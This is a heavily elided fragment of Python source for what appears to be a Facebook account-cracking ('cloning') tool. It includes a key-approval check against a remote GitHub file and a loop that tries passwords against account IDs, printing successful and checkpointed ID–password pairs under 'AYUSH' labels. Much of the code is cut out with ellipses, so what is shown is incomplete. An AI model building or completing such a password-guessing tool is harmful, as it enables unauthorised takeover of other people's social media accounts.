...
def contact():
	os.system('xdg-open https://www.facebook.com/LIINK.COPY.GARIS.RANDII.KE.BAXHEE')
	back()
def animation(u):
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Ayushinxiide/Approval/main/Approval.txt").text
    if id in httpCaht:
      ...
      animation("\x1b[1;97m >> FB Ma Send Han Key Bhaii ");
      time.sleep(0.1)
...
def passu():
	...
	linex()
	prog = Progress(TextColumn('\033[1;97m [AYUSH-XD]{task.description}'))
	...
	with prog:
		...
		linex()
	linex()
	print(' [\u001b[36m•\033[1;37m] Cloniing Sakyo Randii ')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\u001b[33m [AYUSH-CP] {idf} │ {pw}\033[1;97m')
				...
				print(f'\033[1;32m [AYUSH-OK] {idf} │ {pw}\033[1;97m')
